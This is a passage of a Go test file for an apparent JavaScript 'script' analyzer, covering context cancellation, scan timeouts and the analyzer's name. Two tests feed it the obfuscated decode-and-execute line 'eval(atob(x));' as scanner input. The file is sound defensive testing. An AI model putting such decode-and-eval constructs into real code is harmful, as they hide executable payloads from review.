			t.Fatalf("%d bytes: skips = %v, want a full analysis", len(f.Data), out.Skips)
		}
		best = min(best, time.Since(start))
	}
	return best
}

// expiring is a context that reports itself done after its first Err call.
type expiring struct {
	context.Context
	calls int
}

func (c *expiring) Err() error {
	c.calls++
	if c.calls > 1 {
		return context.DeadlineExceeded
	}
	return nil
}

func TestAnalyzeCancelled(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantErr error
	}{
		{name: "context already ended", data: "eval(atob(x));\n", wantErr: context.Canceled},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			cancel()

			_, err := script.New().Analyze(ctx, analyze.File{Path: "a.js", Name: "a.js", Data: []byte(tt.data)})

			if err != tt.wantErr {
				t.Errorf("err = %v, want %v", err, tt.wantErr)
			}
		})
	}
}

func TestAnalyzeTimeout(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantReason string
	}{
		{name: "context ends while scanning", data: "x();" + pad(300) + "eval(atob(x));\n", wantReason: protocol.SkipTimeout},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: "a.js", Name: "a.js", Data: []byte(tt.data)}

			out, err := script.New().Analyze(&expiring{Context: context.Background()}, f)

			if err != nil {
				t.Fatal(err)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != "a.js" {
				t.Errorf("skips = %v, want one %s for a.js", out.Skips, tt.wantReason)
			}
		})
	}
}

func TestName(t *testing.T) {
	tests := []struct {
		name     string
		wantName string
	}{
		{name: "analyzer name", wantName: "script"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := script.New().Name(); got != tt.wantName {
				t.Errorf("Name = %q, want %q", got, tt.wantName)
			}
		})
	}
}
